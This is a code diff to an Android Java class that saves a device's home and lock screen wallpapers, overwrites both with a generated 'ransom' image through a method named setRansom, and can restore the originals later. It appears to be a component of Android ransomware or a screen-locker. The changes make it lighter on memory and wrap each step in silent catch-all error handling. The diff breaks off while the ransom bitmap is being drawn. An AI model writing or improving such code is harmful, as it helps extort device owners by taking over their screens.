@@ -7,14 +7,18 @@ import android.graphics.BitmapFactory;
 import android.graphics.Canvas;
 import android.graphics.Color;
 import android.graphics.Paint;
+import android.graphics.Rect;
 import android.os.ParcelFileDescriptor;
 
 import java.io.File;
+import java.io.FileDescriptor;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.util.Random;
 
 final class WallpaperUtil {
+
+    private static final int MAX_WALLPAPER_CAPTURE = 512;
 
     private WallpaperUtil() {
     }
@@ -24,77 +28,125 @@ final class WallpaperUtil {
     }
 
     static void capture(Context c) {
-        WallpaperManager wm = WallpaperManager.getInstance(c);
-        save(c, decodable(wm, WallpaperManager.FLAG_SYSTEM), "orig_home.png");
-        save(c, decodable(wm, WallpaperManager.FLAG_LOCK), "orig_lock.png");
+        try {
+            WallpaperManager wm = WallpaperManager.getInstance(c);
+            Bitmap home = decodeSampled(wm, WallpaperManager.FLAG_SYSTEM);
+            save(c, home, "orig_home.png");
+            if (home != null) home.recycle();
+            Bitmap lock = decodeSampled(wm, WallpaperManager.FLAG_LOCK);
+            save(c, lock, "orig_lock.png");
+            if (lock != null) lock.recycle();
+        } catch (Throwable t) {
+            // Fail silently - wallpaper capture is non-critical
+        }
     }
 
-    private static Bitmap decodable(WallpaperManager wm, int which) {
+    private static Bitmap decodeSampled(WallpaperManager wm, int which) {
         try {
             ParcelFileDescriptor fd = wm.getWallpaperFile(which);
             if (fd != null) {
-                Bitmap b = BitmapFactory.decodeFileDescriptor(fd.getFileDescriptor());
                 try {
-                    fd.close();
-                } catch (IOException ignored) {
+                    BitmapFactory.Options opts = new BitmapFactory.Options();
+                    opts.inJustDecodeBounds = true;
+                    FileDescriptor fileDesc = fd.getFileDescriptor();
+                    BitmapFactory.decodeFileDescriptor(fileDesc, null, opts);
+                    opts.inSampleSize = calculateInSampleSize(opts, MAX_WALLPAPER_CAPTURE, MAX_WALLPAPER_CAPTURE);
+                    opts.inJustDecodeBounds = false;
+                    opts.inPreferredConfig = Bitmap.Config.RGB_565;
+                    Bitmap b = BitmapFactory.decodeFileDescriptor(fileDesc, null, opts);
+                    return b;
+                } finally {
+                    try { fd.close(); } catch (IOException ignored) {}
                 }
-                return b;
             }
         } catch (Throwable ignored) {
         }
         try {
             android.graphics.drawable.Drawable d = wm.getDrawable();
             if (d instanceof android.graphics.drawable.BitmapDrawable) {
-                return ((android.graphics.drawable.BitmapDrawable) d).getBitmap();
+                Bitmap src = ((android.graphics.drawable.BitmapDrawable) d).getBitmap();
+                if (src != null && !src.isRecycled()) {
+                    float scale = Math.min(1f, (float) MAX_WALLPAPER_CAPTURE / Math.max(src.getWidth(), src.getHeight()));
+                    if (scale < 1f) {
+                        return Bitmap.createScaledBitmap(src,
+                                (int)(src.getWidth() * scale), (int)(src.getHeight() * scale), false);
+                    }
+                    return src.copy(Bitmap.Config.RGB_565, false);
+                }
             }
         } catch (Throwable ignored) {
         }
         return null;
     }
 
+    private static int calculateInSampleSize(BitmapFactory.Options opts, int reqW, int reqH) {
+        int h = opts.outHeight, w = opts.outWidth;
+        int inSampleSize = 1;
+        if (h > reqH || w > reqW) {
+            int halfH = h / 2, halfW = w / 2;
+            while ((halfH / inSampleSize) >= reqH && (halfW / inSampleSize) >= reqW) {
+                inSampleSize *= 2;
+            }
+        }
+        return inSampleSize;
+    }
+
     private static void save(Context c, Bitmap b, String name) {
         if (b == null) return;
         try (FileOutputStream fos = new FileOutputStream(origFile(c, name))) {
-            b.compress(Bitmap.CompressFormat.PNG, 100, fos);
-        } catch (IOException ignored) {
+            b.compress(Bitmap.CompressFormat.JPEG, 85, fos);
+        } catch (Throwable ignored) {
         }
     }
 
     static void setRansom(Context c) {
-        Bitmap ransom = render(c);
-        WallpaperManager wm = WallpaperManager.getInstance(c);
+        Bitmap ransom = null;
         try {
-            wm.setBitmap(ransom, null, true, WallpaperManager.FLAG_SYSTEM);
+            ransom = render(c);
+            WallpaperManager wm = WallpaperManager.getInstance(c);
+            try {
+                wm.setBitmap(ransom, null, true, WallpaperManager.FLAG_SYSTEM);
+            } catch (Throwable ignored) {
+            }
+            try {
+                wm.setBitmap(ransom, null, true, WallpaperManager.FLAG_LOCK);
+            } catch (Throwable ignored) {
+            }
         } catch (Throwable ignored) {
-        }
-        try {
-            wm.setBitmap(ransom, null, true, WallpaperManager.FLAG_LOCK);
-        } catch (Throwable ignored) {
+        } finally {
+            if (ransom != null && !ransom.isRecycled()) {
+                ransom.recycle();
+            }
         }
     }
 
     static void restore(Context c) {
-        WallpaperManager wm = WallpaperManager.getInstance(c);
-        Bitmap home = BitmapFactory.decodeFile(origFile(c, "orig_home.png").getAbsolutePath());
-        if (home != null) {
-            try {
-                wm.setBitmap(home, null, true, WallpaperManager.FLAG_SYSTEM);
-            } catch (Throwable ignored) {
+        try {
+            WallpaperManager wm = WallpaperManager.getInstance(c);
+            Bitmap home = BitmapFactory.decodeFile(origFile(c, "orig_home.png").getAbsolutePath());
+            if (home != null) {
+                try {
+                    wm.setBitmap(home, null, true, WallpaperManager.FLAG_SYSTEM);
+                } catch (Throwable ignored) {
+                }
+                home.recycle();
             }
-        }
-        Bitmap lock = BitmapFactory.decodeFile(origFile(c, "orig_lock.png").getAbsolutePath());
-        if (lock != null) {
-            try {
-                wm.setBitmap(lock, null, true, WallpaperManager.FLAG_LOCK);
-            } catch (Throwable ignored) {
+            Bitmap lock = BitmapFactory.decodeFile(origFile(c, "orig_lock.png").getAbsolutePath());
+            if (lock != null) {
+                try {
+                    wm.setBitmap(lock, null, true, WallpaperManager.FLAG_LOCK);
+                } catch (Throwable ignored) {
+                }
+                lock.recycle();
             }
+        } catch (Throwable ignored) {
         }
     }
 
     private static Bitmap render(Context c) {
         int w = c.getResources().getDisplayMetrics().widthPixels;
         int h = c.getResources().getDisplayMetrics().heightPixels;
-        Bitmap b = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
+        Bitmap b = Bitmap.createBitmap(w, h, Bitmap.Config.RGB_565);
         Canvas canvas = new Canvas(b);
         canvas.drawColor(Color.BLACK);
 
